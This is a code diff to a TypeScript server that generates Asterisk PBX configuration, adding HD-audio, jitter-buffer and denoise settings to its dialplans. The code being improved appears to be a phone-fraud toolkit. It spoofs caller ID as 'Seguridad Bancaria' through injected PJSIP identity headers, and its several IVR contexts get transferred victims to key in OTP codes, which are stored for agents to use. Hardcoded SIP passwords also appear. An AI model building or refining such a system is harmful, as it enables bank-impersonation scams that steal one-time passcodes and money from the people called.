@@ -183,6 +183,55 @@ maximum_on_length = 2000
   } catch (_) {}
 }
 
+// Helper to ensure Asterisk codecs.conf and rtp.conf exist for crystal-clear bidirectional audio
+function ensureAudioCodecsAndRtpConfExists() {
+  const codecsPath = '/etc/asterisk/codecs.conf';
+  const codecsContent = `; ========================================================
+; Asterisk HD Voice Codecs & Audio DSP Processing
+; Máxima Fidelidad de Audio Bidireccional (Ambas Vías)
+; ========================================================
+[opus]
+type=opus
+max_playback_rate=48000
+max_bandwidth=fullband
+cbr=no
+fec=yes
+dtx=no
+
+[speex]
+type=speex
+quality=10
+complexity=4
+enhancement=true
+vad=false
+vbr=true
+`;
+
+  const rtpPath = '/etc/asterisk/rtp.conf';
+  const rtpContent = `; ========================================================
+; Asterisk Real-time Transport Protocol (RTP) Configuration
+; ========================================================
+[general]
+rtpstart=10000
+rtpend=20000
+rtpchecksums=no
+strictrtp=yes
+probation=8
+icesupport=yes
+`;
+
+  try {
+    if (!fs.existsSync(codecsPath)) {
+      writeAsteriskConfigFile(codecsPath, codecsContent);
+      console.log('✓ Configuración /etc/asterisk/codecs.conf creada para HD Opus y Speex Denoise');
+    }
+    if (!fs.existsSync(rtpPath)) {
+      writeAsteriskConfigFile(rtpPath, rtpContent);
+      console.log('✓ Configuración /etc/asterisk/rtp.conf creada');
+    }
+  } catch (_) {}
+}
+
 // High-speed AMI Originate using direct asynchronous socket (under 20ms launch time)
 function amiFastOriginate(
   channel: string,
@@ -474,14 +523,14 @@ app.get('/api/health', (req, res) => {
   });
 });
 
-// Default extensions with valid credentials and settings for Asterisk 20
+// Default extensions with valid credentials and settings for Asterisk 20 (HD Voice prioritized)
 const defaultExtensionsList = [
   {
     extension: '1001',
     name: 'Operador Principal',
     secret: 'Secr3tP@ssw0rd!1001',
     context: 'from-internal',
-    codecs: ['ulaw', 'alaw', 'g722'],
+    codecs: ['opus', 'g722', 'ulaw', 'alaw', 'g729'],
     maxContacts: 5,
     transport: 'transport-udp',
     port: 47923,
@@ -493,7 +542,7 @@ const defaultExtensionsList = [
     name: 'Agente Soporte 2',
     secret: 'S0p0rte#2026@1002',
     context: 'from-internal',
-    codecs: ['ulaw', 'alaw', 'opus'],
+    codecs: ['opus', 'g722', 'ulaw', 'alaw', 'g729'],
     maxContacts: 5,
     transport: 'transport-udp',
     port: 47923,
@@ -505,7 +554,7 @@ const defaultExtensionsList = [
     name: 'Agente Soporte 3',
     secret: 'S0p0rte#2026@1003',
     context: 'from-internal',
-    codecs: ['ulaw', 'alaw', 'opus', 'g722'],
+    codecs: ['opus', 'g722', 'ulaw', 'alaw', 'g729'],
     maxContacts: 5,
     transport: 'transport-udp',
     port: 47923,
@@ -517,7 +566,7 @@ const defaultExtensionsList = [
     name: 'Supervisor Turno',
     secret: 'Superv1sor2026!',
     context: 'from-internal',
-    codecs: ['ulaw', 'alaw', 'g729'],
+    codecs: ['opus', 'g722', 'ulaw', 'alaw', 'g729'],
     maxContacts: 5,
     transport: 'transport-udp',
     port: 47923,
@@ -538,7 +587,7 @@ export const defaultCarriersList = [
     inboundContext: 'trunkinbound',
     outboundCallerId: '+18005550199',
     outboundCallerIdName: 'Seguridad Bancaria',
-    codecs: ['ulaw', 'alaw', 'g729'],
+    codecs: ['opus', 'g722', 'ulaw', 'alaw', 'g729'],
     qualifyFreq: 60,
     status: 'reachable',
     latencyMs: 18,
@@ -561,7 +610,7 @@ export const defaultCarriersList = [
     inboundContext: 'trunkinbound',
     outboundCallerId: '+18005550199',
     outboundCallerIdName: 'Seguridad Bancaria',
-    codecs: ['ulaw', 'alaw', 'g729'],
+    codecs: ['opus', 'g722', 'ulaw', 'alaw', 'g729'],
     qualifyFreq: 60,
     status: 'reachable',
     latencyMs: 24,
@@ -618,7 +667,7 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = defaultCarr
     const callerIdNum = ext.callerIdNum || ext.outboundCallerId || num;
     const callerIdName = ext.callerIdName || ext.name || `Extension ${num}`;
     const callerId = `"${callerIdName}" <${callerIdNum}>`;
-    const codecs = (ext.codecs && ext.codecs.length > 0) ? ext.codecs.join(',') : 'ulaw,alaw,g722';
+    const codecs = (ext.codecs && ext.codecs.length > 0) ? ext.codecs.join(',') : 'opus,g722,ulaw,alaw,g729';
     const extPort = parseInt(ext.port, 10) || activePort;
 
     let transport = 'transport-udp';
@@ -651,7 +700,12 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = defaultCarr
     pjsipContent += `trust_id_outbound = yes\n`;
     pjsipContent += `trust_id_inbound = yes\n`;
     pjsipContent += `identify_by = auth_username,username\n`;
-    pjsipContent += `callerid_privacy = allowed\n\n`;
+    pjsipContent += `callerid_privacy = allowed\n`;
+    pjsipContent += `dtmf_mode = rfc4733\n`;
+    pjsipContent += `rtp_keepalive = 5\n`;
+    pjsipContent += `asymmetric_rtp_codec = no\n`;
+    pjsipContent += `timers = yes\n`;
+    pjsipContent += `language = es\n\n`;
 
     pjsipContent += `[${num}-auth]\n`;
     pjsipContent += `type = auth\n`;
@@ -696,7 +750,7 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = defaultCarr
       const cUser = carrier.username || cName;
       const cSecret = carrier.secret || '';
       const cContext = carrier.inboundContext || 'trunkinbound';
-      const cCodecs = (carrier.codecs && carrier.codecs.length > 0) ? carrier.codecs.join(',') : 'ulaw,alaw,g729';
+      const cCodecs = (carrier.codecs && carrier.codecs.length > 0) ? carrier.codecs.join(',') : 'opus,g722,ulaw,alaw,g729';
 
       pjsipContent += `; --- CARRIER: ${cName} (${cHost}:${cPort}) ---\n`;
 
@@ -753,6 +807,11 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = defaultCarr
       pjsipContent += `trust_id_outbound = yes\n`;
       pjsipContent += `trust_id_inbound = ${carrier.trustrpid || 'yes'}\n`;
       pjsipContent += `callerid_privacy = allowed\n`;
+      pjsipContent += `dtmf_mode = rfc4733\n`;
+      pjsipContent += `rtp_keepalive = 5\n`;
+      pjsipContent += `asymmetric_rtp_codec = no\n`;
+      pjsipContent += `timers = yes\n`;
+      pjsipContent += `language = es\n`;
       pjsipContent += `transport = transport-udp\n\n`;
 
       pjsipContent += `[${cName}-identify]\n`;
@@ -864,18 +923,38 @@ function generateCleanDialplanConf(
   dialplanContent += `GLOBAL_DEFAULT_SUCCESS=${chosenSuccess}\n`;
   dialplanContent += `GLOBAL_DEFAULT_AGENT=${chosenAgent}\n\n`;
 
-  dialplanContent += `; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real\n`;
+  dialplanContent += `; Subrutina Pre-Dial para inyectar cabeceras PJSIP y optimizacion de audio en canal saliente real (HD Voice, Anti-Jitter y Denoise Bidireccional)\n`;
   dialplanContent += `[sub-pjsip-headers]\n`;
-  dialplanContent += `exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)\n`;
+  dialplanContent += `exten => s,1,NoOp(=== Inyectando PJSIP Headers, JitterBuffer Adaptativo y Filtros HD en Canal Saliente: \${CHANNEL} ===)\n`;
   dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
   dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)\n`;
   dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>\\;party=calling\\;screen=yes\\;privacy=off)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Return()\n\n`;
+
+  dialplanContent += `; Subrutina Pre-Dial para optimizacion de audio bidireccional (HD Voice, Anti-Jitter y Cancelacion de Ruido) al conectar con asesor\n`;
+  dialplanContent += `[sub-audio-quality]\n`;
+  dialplanContent += `exten => s,1,NoOp(=== [AUDIO-HD-BIDIRECCIONAL] JitterBuffer Adaptativo y Calidad HD en Canal: \${CHANNEL} ===)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Return()\n\n`;
 
   dialplanContent += `[from-internal]\n`;
-  dialplanContent += `; 1. Llamadas internas entre extensiones (1001-1999)\n`;
-  dialplanContent += `exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
+  dialplanContent += `; 1. Llamadas internas entre extensiones (1001-1999) con Audio HD y Denoise en ambas vías\n`;
+  dialplanContent += `exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN} con optimización HD)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   // 2a. Extensiones Dedicadas de Captura OTP al Transferir (Extensiones 3333, 4444, 5555, 6666, 7777 y 777)
@@ -1082,7 +1161,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
   dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;
 
-  dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
+  dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845) con Audio HD Bidireccional\n`;
   dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
   dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(__CALL_DEST=\${EXTEN})\n`;
@@ -1094,10 +1173,15 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
-  dialplanContent += `; 4. Regla Saliente USA / Canada 10 digitos (ej. 6104803845 -> prepends 1)\n`;
+  dialplanContent += `; 4. Regla Saliente USA / Canada 10 digitos (ej. 6104803845 -> prepends 1) con Audio HD Bidireccional\n`;
   dialplanContent += `exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via ${activeCarrier})\n`;
   dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(__CALL_DEST=1\${EXTEN})\n`;
@@ -1110,10 +1194,15 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
-  dialplanContent += `; 5. Regla Saliente Universal (Cualquier longitud)\n`;
+  dialplanContent += `; 5. Regla Saliente Universal (Cualquier longitud) con Audio HD Bidireccional\n`;
   dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
   dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
   dialplanContent += ` same => n,Set(__CALL_DEST=\${EXTEN})\n`;
@@ -1125,6 +1214,11 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -1134,9 +1228,27 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;
 
   dialplanContent += `[from-trunk]\n`;
-  dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
+  dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)} con Audio HD)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
   dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;
+
+  dialplanContent += `exten => s,1,NoOp(Llamada Entrante s por Troncal: \${CALLERID(num)} con Audio HD)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
+  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;
+
+  dialplanContent += `[trunkinbound]\n`;
+  dialplanContent += `exten => _X.,1,Goto(from-trunk,\${EXTEN},1)\n`;
+  dialplanContent += `exten => s,1,Goto(from-trunk,s,1)\n\n`;
 
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777\n`;
@@ -1147,6 +1259,11 @@ function generateCleanDialplanConf(
   dialplanContent += `[ivr-captura-vivo]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
@@ -1193,7 +1310,8 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 2]?pedir_codigo)\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Sin digitos tras reintentos -> Regresando llamada al agente \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=default)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += ` ; Digitos capturados (minimo 4 digitos)\n`;
@@ -1260,7 +1378,8 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=default)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += ` ; RAMA RECHAZADO: Asesor marco INVALIDO en la web -> Locucion de error y vuelve a pedir el codigo\n`;
@@ -1331,7 +1450,8 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 2]?pedir_codigo)\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-6666] Sin digitos tras reintentos -> Regresando llamada al agente \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=default)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-6666] CODIGO DIGITADO: \${USER_DIGITS} -> NOTIFICANDO AL ASESOR ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
@@ -1391,7 +1511,8 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=default)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-6666] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
@@ -1422,6 +1543,11 @@ function generateCleanDialplanConf(
   dialplanContent += `[ivr-captura-vivo-3333]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-3333] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
@@ -1459,7 +1585,12 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Playback(beep)\n`;
   dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 3]?pedir_codigo)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Tt)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-3333] DIGITOS RECIBIDOS DEL CLIENTE: \${USER_DIGITS} ===)\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
@@ -1513,7 +1644,12 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-3333] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
@@ -1543,6 +1679,11 @@ function generateCleanDialplanConf(
   dialplanContent += `[ivr-captura-vivo-4444]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-4444] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
@@ -1580,7 +1721,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Playback(beep)\n`;
   dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 3]?pedir_codigo)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Tt)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-4444] DIGITOS RECIBIDOS DEL CLIENTE: \${USER_DIGITS} ===)\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
@@ -1634,7 +1775,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
   dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-4444] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
@@ -1664,6 +1805,11 @@ function generateCleanDialplanConf(
   dialplanContent += `[ivr-captura-vivo-5555]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-5555] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
+  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
@@ -1701,7 +1847,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Playback(beep)\n`;
   dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 3]?pedir_codigo)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
-  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Tt)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},30,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
